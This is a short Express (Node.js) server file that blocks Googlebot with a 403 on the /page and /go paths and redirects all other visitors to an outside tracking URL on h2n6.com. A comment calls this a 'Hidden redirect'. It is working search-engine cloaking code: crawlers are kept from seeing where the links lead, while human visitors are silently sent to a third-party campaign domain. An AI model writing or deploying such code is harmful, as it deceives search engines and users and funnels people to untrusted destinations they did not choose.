import express from "express";
const app = express();

// Block Googlebot from /page and /go folders
app.use(["/page", "/go"], (req, res, next) => {
  const ua = req.headers["user-agent"] || "";
  if (ua.includes("Googlebot")) return res.status(403).send("Forbidden");
  next();
});

// Hidden redirect for /page
app.get("/page", (req, res) => {
  const ua = req.headers["user-agent"] || "";
  if (ua.includes("Googlebot")) return res.status(403).send("Forbidden");
  res.redirect("http://h2n6.com/?utm_campaign=9qv8yQwH8i&v1=[v1]&v2=[v2]&v3=[v3]");
});

// Optional individual redirects
app.get("/go/lap", (req, res) => res.redirect("http://h2n6.com/?utm_campaign=9qv8yQwH8i&v1=[v1]&v2=[v2]&v3=[v3]"));
app.get("/go/tab", (req, res) => res.redirect("http://h2n6.com/?utm_campaign=9qv8yQwH8i&v1=[v1]&v2=[v2]&v3=[v3]"));
app.get("/go/mob", (req, res) => res.redirect("http://h2n6.com/?utm_campaign=9qv8yQwH8i&v1=[v1]&v2=[v2]&v3=[v3]"));

app.use(express.static("public"));

app.listen(process.env.PORT || 3000, () => {
  console.log("✅ Server running on port 3000");
});
